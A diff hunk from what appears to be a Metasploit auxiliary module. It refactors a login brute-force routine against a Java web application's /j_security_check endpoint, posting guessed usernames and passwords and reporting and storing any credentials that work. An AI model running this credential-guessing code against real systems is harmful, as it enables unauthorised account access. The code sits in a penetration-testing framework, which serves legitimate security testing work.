@@ -82,46 +82,61 @@ class Metasploit3 < Msf::Auxiliary
 						if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/JSESSIONID=(.*);(.*)/i))
 							jsessionid = $1
 
-							post_data = "j_username=#{username}&j_password=#{password}&LDAPEnable=false&hidden=%D0%92%D1%8B%D0%B1%D0%B5%D1%80%D0%B8%D1%82%D0%B5\
-							+%D0%B4%D0%BE%D0%BC%D0%B5%D0%BD&hidden=%D0%94%D0%BB%D1%8F\
-							+%D0%94%D0%BE%D0%BC%D0%B5%D0%BD%D0%B0&AdEnable=false&DomainCount=0&\
-							LocalAuth=No&LocalAuthWithDomain=No&dynamicUserAddition_status=true\
-							&localAuthEnable=true&logonDomainName=-1"
+							client = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['RPORT'])
+							begin
+								req = client.request_cgi(
+									'uri'          => '/j_security_check',
+									'method'       => 'POST',
+									'content-type' => 'application/x-www-form-urlencoded',
+									'cookie'       => "JSESSIONID=#{jsessionid}",
+									'vars_get'     => {
+										"j_username" => "#{username}",
+										"j_password" => "#{password}",
+										"LDAPEnable" => "false",
+										"hidden" => "%D0%92%D1%8B%D0%B1%D0%B5%D1%80%D0%B8%D1%82%D0%B5+%D0%B4%D0%BE%D0%BC%D0%B5%D0%BD",
+										"hidden" => "%D0%94%D0%BB%D1%8F+%D0%94%D0%BE%D0%BC%D0%B5%D0%BD%D0%B0",
+										"AdEnable" => "false",
+										"DomainCount" => "0",
+										"LocalAuth" => "No",
+										"LocalAuthWithDomain" => "No",
+										"dynamicUserAddition_status" => "true",
+										"localAuthEnable" => "true",
+										"logonDomainName" => "-1",
+									}
+								)
 
-							res = send_request_cgi({
-								'uri'          => '/j_security_check',
-								'method'       => 'POST',
-								'content-type' => 'application/x-www-form-urlencoded',
-								'cookie'       => "JSESSIONID=#{jsessionid}",
-								'data'         => post_data
-							}, 25)
+								resp = client.send_recv(req, 500)
 
-							if (res.code == 302)
-								res = send_request_cgi({
-									'uri'     => '/HomePage.do?logout=true&logoutSkipNV2Filter=true',
-									'method'  => 'GET',
-									'cookie'  => "JSESSIONID=#{jsessionid}"
-								}, 25)
+								if (resp.code == 302)
+									res = send_request_cgi({
+										'uri'     => '/HomePage.do?logout=true&logoutSkipNV2Filter=true',
+										'method'  => 'GET',
+										'cookie'  => "JSESSIONID=#{jsessionid}"
+									}, 25)
 
-								if (res.code == 200)
-									print_good("Found account:")
-									print_good("login: #{username}")
-									print_good("password: #{password}\n")
-									report_auth_info(
-										:host  => datastore['RHOST'],
-										:port => datastore['RPORT'],
-										:sname => 'http',
-										:user => username,
-										:pass => password,
-										:active => true
-									)
+									if (res.code == 200)
+										print_good("Found account:")
+										print_good("login: #{username}")
+										print_good("password: #{password}\n")
+										report_auth_info(
+											:host  => datastore['RHOST'],
+											:port => datastore['RPORT'],
+											:sname => 'http',
+											:user => username,
+											:pass => password,
+											:active => true
+										)
+									end
+
+									if(flag_got_user == 0)
+										@session_table = {"#{username}" => "#{jsessionid}"}
+										has_default = true
+										flag_got_user = 1
+									end
 								end
 
-								if(flag_got_user == 0)
-									@session_table = {"#{username}" => "#{jsessionid}"}
-									has_default = true
-									flag_got_user = 1
-								end
+							ensure
+								client.close
 							end
 						end
 					end
